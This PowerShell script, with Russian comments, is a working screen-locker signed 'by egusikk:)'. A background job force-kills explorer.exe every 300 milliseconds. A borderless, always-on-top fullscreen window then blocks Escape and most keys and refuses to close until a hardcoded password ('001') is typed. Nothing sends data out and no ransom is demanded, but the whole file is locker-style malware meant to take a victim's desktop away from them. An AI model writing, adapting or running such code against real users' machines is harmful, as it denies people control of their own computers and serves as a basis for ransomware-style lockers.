Add-Type -AssemblyName PresentationFramework
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$global:Unlocked = $false

# Фоновый поток для принудительного закрытия Explorer
$BlockExplorerJob = {
    while ($true) {
        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($explorer) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 300
    }
}
$job = Start-Job -ScriptBlock $BlockExplorerJob

function Show-PasswordWindow {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk:)"
    
    # НАСТРОЙКИ СВЕРХУВЕРЕННОГО ОКНА НА ВЕСЬ ЭКРАН
    $form.WindowState = "Maximized"
    $form.FormBorderStyle = "None" # Убирает рамку и крестик
    $form.TopMost = $true 
    $form.BackColor = [System.Drawing.Color]::Black # Черный фон для эффекта блокировки
    $form.Capture = $true

    # Контейнер для элементов по центру экрана
    $panel = New-Object System.Windows.Forms.Panel
    $panel.Size = New-Object System.Drawing.Size(350, 180)
    $panel.BackColor = [System.Drawing.Color]::DarkGray # Выделяющийся блок формы
    $form.Controls.Add($panel)

    # Центрирование панели при изменении размеров экрана
    $form.Add_Resize({
        $panel.Left = ($form.ClientSize.Width - $panel.Width) / 2
        $panel.Top = ($form.ClientSize.Height - $panel.Height) / 2
    })

    $label = New-Object System.Windows.Forms.Label
    $label.Location = New-Object System.Drawing.Point(20, 20)
    $label.Size = New-Object System.Drawing.Size(310, 20)
    $label.Text = "enter pass for unlock:"
    $panel.Controls.Add($label)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Location = New-Object System.Drawing.Point(20, 50)
    $textBox.Size = New-Object System.Drawing.Size(290, 20)
    $textBox.PasswordChar = "*" 
    $panel.Controls.Add($textBox)

    $button = New-Object System.Windows.Forms.Button
    $button.Location = New-Object System.Drawing.Point(120, 90)
    $button.Size = New-Object System.Drawing.Size(100, 30)
    $button.Text = "Unlock"
    $panel.Controls.Add($button)

    $form.AcceptButton = $button

    # Логика проверки пароля
    $UnlockAction = {
        if ($textBox.Text -eq "001") {
            $global:Unlocked = $true
            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("Incorrect password!", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            $textBox.Clear()
            $textBox.Focus()
        }
    }

    $button.Add_Click($UnlockAction)

    # БЛОКИРОВКА КЛАВИАТУРЫ: Разрешаем только цифры, Enter и Backspace. ESCAPE блокируется тут.
    $textBox.Add_KeyPress({
        param($_, $e)
        $char = $e.KeyChar
        
        # Разрешаем: Цифры (0-9), Enter (13), Backspace (8)
        if (-not (($char -ge '0' -and $char -le '9') -or $char -eq [char]13 -or $char -eq [char]8)) {
            $e.Handled = $true
        }
    })

    # Дополнительная блокировка системных клавиш (включая Escape) на уровне самой формы
    $form.KeyPreview = $true
    $form.Add_KeyDown({
        param($_, $e)
        # Блокировка клавиши Escape
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
            $e.SuppressKeyPress = $true
        }
    })

    $textBox.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
            & $UnlockAction
            $e.Handled = $true
            $e.SuppressKeyPress = $true
        }
        # Блокировка Escape внутри текстового поля
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
            $e.SuppressKeyPress = $true
        }
    })

    # Запрет закрытия формы
    $form.Add_FormClosing({
        param($_, $e)
        if ($global:Unlocked -eq $false) {
            $e.Cancel = $true
        }
    })

    $form.Add_Shown({ $textBox.Focus() })

    $form.ShowDialog() | Out-Null
}

Show-PasswordWindow

if ($global:Unlocked -eq $true) {
    Stop-Job $job
    Remove-Job $job
    Start-Process "explorer.exe"
}
